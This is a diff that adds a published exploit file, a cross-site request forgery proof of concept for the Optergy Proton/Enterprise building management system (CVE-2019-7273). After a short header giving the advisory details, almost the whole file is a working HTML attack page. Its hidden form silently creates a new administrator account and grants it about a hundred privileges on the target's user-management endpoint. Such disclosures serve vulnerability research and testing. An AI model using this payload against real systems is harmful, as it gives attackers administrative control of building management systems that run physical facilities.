@@ -1,0 +1,160 @@
+# Title: Optergy 2.3.0a - Cross-Site Request Forgery (Add Admin)
+# Author: LiquidWorm
+# Date: 2019-11-05
+# Vendor: https://optergy.com/
+# Product web page: https://optergy.com/products/
+# Affected version: <=2.3.0a
+# Advisory: https://applied-risk.com/resources/ar-2019-008
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# CVE: CVE-2019-7273
+
+# Optergy Proton/Enterprise BMS CSRF Add Admin
+
+<!-- CSRF Add Admin Exploit -->
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.232.19/controlPanel/ajax/UserManipulation.html?add" method="POST">
+      <input type="hidden" name="user.accountEnabled" value="true" />
+      <input type="hidden" name="user.username" value="testingus" />
+      <input type="hidden" name="user.password" value="testingus" />
+      <input type="hidden" name="confirmPassword" value="testingus" />
+      <input type="hidden" name="user.firstname" value="Tester" />
+      <input type="hidden" name="user.lastname" value="Testovski" />
+      <input type="hidden" name="user.companyName" value="TEST Inc." />
+      <input type="hidden" name="user.address" value="TestStr 17-251" />
+      <input type="hidden" name="user.emailAddress" value="aa@bb.cc" />
+      <input type="hidden" name="user.departmentId" value="" />
+      <input type="hidden" name="user.phoneNumber" value="1112223333" />
+      <input type="hidden" name="user.mobileNumber" value="1233211234" />
+      <input type="hidden" name="securityLevel" value="10" />
+      <input type="hidden" name="user.showBanner" value="true" />
+      <input type="hidden" name="user.showMenu" value="true" />
+      <input type="hidden" name="user.showAlarmTab" value="true" />
+      <input type="hidden" name="user.visibleAlarms" value="0" />
+      <input type="hidden" name="user.showBookmarks" value="true" />
+      <input type="hidden" name="user.showNotificationTab" value="true" />
+      <input type="hidden" name="user.autoDismissFeedback" value="true" />
+      <input type="hidden" name="user.canChangeBookmarks" value="true" />
+      <input type="hidden" name="user.canChangePassword" value="true" />
+      <input type="hidden" name="user.canUpdateProfile" value="true" />
+      <input type="hidden" name="homepage-text" value="" />
+      <input type="hidden" name="user.homePageType" value="" />
+      <input type="hidden" name="user.homePage" value="" />
+      <input type="hidden" name="background" value="" />
+      <input type="hidden" name="user.backgroundImage-text" value="" />
+      <input type="hidden" name="user.backgroundImage" value="" />
+      <input type="hidden" name="user.backgroundTiled" value="" />
+      <input type="hidden" name="user.backgroundColour" value="" />
+      <input type="hidden" name="newMemberships" value="1" />
+      <input type="hidden" name="user.id" value="" />
+      <input type="hidden" name="_sourcePage" value="/WEB-INF/jsp/controlPanel/UserAdministration.jsp" />
+      <input type="hidden" name="__fp" value="user.showBookmarks||user.showNotificationTab||user.emailSystemNotifications||user.addToSiteDirectory||user.showMenu||user.departmentId||user.showAlarmTab||user.smsAlarms||user.showBanner||accountExpires||user.autoDismissFeedback||user.changePasswordOnNextLogin||passwordExpires||user.showUserProfile||user.canUpdateProfile||user.canChangePassword||user.canChangeBookmarks||user.accountEnabled||" />
+      <input type="hidden" name="newPrivileges" value="7" />
+      <input type="hidden" name="newPrivileges" value="9" />
+      <input type="hidden" name="newPrivileges" value="8" />
+      <input type="hidden" name="newPrivileges" value="10" />
+      <input type="hidden" name="newPrivileges" value="13" />
+      <input type="hidden" name="newPrivileges" value="14" />
+      <input type="hidden" name="newPrivileges" value="12" />
+      <input type="hidden" name="newPrivileges" value="2" />
+      <input type="hidden" name="newPrivileges" value="3" />
+      <input type="hidden" name="newPrivileges" value="4" />
+      <input type="hidden" name="newPrivileges" value="139" />
+      <input type="hidden" name="newPrivileges" value="138" />
+      <input type="hidden" name="newPrivileges" value="141" />
+      <input type="hidden" name="newPrivileges" value="140" />
+      <input type="hidden" name="newPrivileges" value="124" />
+      <input type="hidden" name="newPrivileges" value="128" />
+      <input type="hidden" name="newPrivileges" value="119" />
+      <input type="hidden" name="newPrivileges" value="19" />
+      <input type="hidden" name="newPrivileges" value="17" />
+      <input type="hidden" name="newPrivileges" value="18" />
+      <input type="hidden" name="newPrivileges" value="20" />
+      <input type="hidden" name="newPrivileges" value="21" />
+      <input type="hidden" name="newPrivileges" value="24" />
+      <input type="hidden" name="newPrivileges" value="23" />
+      <input type="hidden" name="newPrivileges" value="132" />
+      <input type="hidden" name="newPrivileges" value="131" />
+      <input type="hidden" name="newPrivileges" value="134" />
+      <input type="hidden" name="newPrivileges" value="147" />
+      <input type="hidden" name="newPrivileges" value="25" />
+      <input type="hidden" name="newPrivileges" value="135" />
+      <input type="hidden" name="newPrivileges" value="105" />
+      <input type="hidden" name="newPrivileges" value="59" />
+      <input type="hidden" name="newPrivileges" value="142" />
+      <input type="hidden" name="newPrivileges" value="28" />
+      <input type="hidden" name="newPrivileges" value="27" />
+      <input type="hidden" name="newPrivileges" value="102" />
+      <input type="hidden" name="newPrivileges" value="31" />
+      <input type="hidden" name="newPrivileges" value="125" />
+      <input type="hidden" name="newPrivileges" value="30" />
+      <input type="hidden" name="newPrivileges" value="108" />
+      <input type="hidden" name="newPrivileges" value="129" />
+      <input type="hidden" name="newPrivileges" value="33" />
+      <input type="hidden" name="newPrivileges" value="34" />
+      <input type="hidden" name="newPrivileges" value="36" />
+      <input type="hidden" name="newPrivileges" value="37" />
+      <input type="hidden" name="newPrivileges" value="38" />
+      <input type="hidden" name="newPrivileges" value="46" />
+      <input type="hidden" name="newPrivileges" value="127" />
+      <input type="hidden" name="newPrivileges" value="41" />
+      <input type="hidden" name="newPrivileges" value="42" />
+      <input type="hidden" name="newPrivileges" value="45" />
+      <input type="hidden" name="newPrivileges" value="44" />
+      <input type="hidden" name="newPrivileges" value="49" />
+      <input type="hidden" name="newPrivileges" value="48" />
+      <input type="hidden" name="newPrivileges" value="112" />
+      <input type="hidden" name="newPrivileges" value="113" />
+      <input type="hidden" name="newPrivileges" value="117" />
+      <input type="hidden" name="newPrivileges" value="115" />
+      <input type="hidden" name="newPrivileges" value="116" />
+      <input type="hidden" name="newPrivileges" value="133" />
+      <input type="hidden" name="newPrivileges" value="51" />
+      <input type="hidden" name="newPrivileges" value="54" />
+      <input type="hidden" name="newPrivileges" value="56" />
+      <input type="hidden" name="newPrivileges" value="55" />
+      <input type="hidden" name="newPrivileges" value="66" />
+      <input type="hidden" name="newPrivileges" value="67" />
+      <input type="hidden" name="newPrivileges" value="60" />
+      <input type="hidden" name="newPrivileges" value="61" />
+      <input type="hidden" name="newPrivileges" value="62" />
+      <input type="hidden" name="newPrivileges" value="68" />
+      <input type="hidden" name="newPrivileges" value="69" />
+      <input type="hidden" name="newPrivileges" value="103" />
+      <input type="hidden" name="newPrivileges" value="104" />
+      <input type="hidden" name="newPrivileges" value="64" />
+      <input type="hidden" name="newPrivileges" value="65" />
+      <input type="hidden" name="newPrivileges" value="71" />
+      <input type="hidden" name="newPrivileges" value="121" />
+      <input type="hidden" name="newPrivileges" value="122" />
+      <input type="hidden" name="newPrivileges" value="85" />
+      <input type="hidden" name="newPrivileges" value="86" />
+      <input type="hidden" name="newPrivileges" value="74" />
+      <input type="hidden" name="newPrivileges" value="76" />
+      <input type="hidden" name="newPrivileges" value="144" />
+      <input type="hidden" name="newPrivileges" value="75" />
+      <input type="hidden" name="newPrivileges" value="77" />
+      <input type="hidden" name="newPrivileges" value="78" />
+      <input type="hidden" name="newPrivileges" value="79" />
+      <input type="hidden" name="newPrivileges" value="73" />
+      <input type="hidden" name="newPrivileges" value="143" />
+      <input type="hidden" name="newPrivileges" value="109" />
+      <input type="hidden" name="newPrivileges" value="110" />
+      <input type="hidden" name="newPrivileges" value="88" />
+      <input type="hidden" name="newPrivileges" value="89" />
+      <input type="hidden" name="newPrivileges" value="90" />
+      <input type="hidden" name="newPrivileges" value="118" />
+      <input type="hidden" name="newPrivileges" value="95" />
+      <input type="hidden" name="newPrivileges" value="93" />
+      <input type="hidden" name="newPrivileges" value="96" />
+      <input type="hidden" name="newPrivileges" value="94" />
+      <input type="hidden" name="newPrivileges" value="92" />
+      <input type="hidden" name="newPrivileges" value="98" />
+      <input type="hidden" name="newPrivileges" value="99" />
+      <input type="hidden" name="newPrivileges" value="146" />
+      <input type="hidden" name="newPrivileges" value="100" />
+      <input type="submit" value="Forgery" />
+    </form>
+  </body>
+</html>
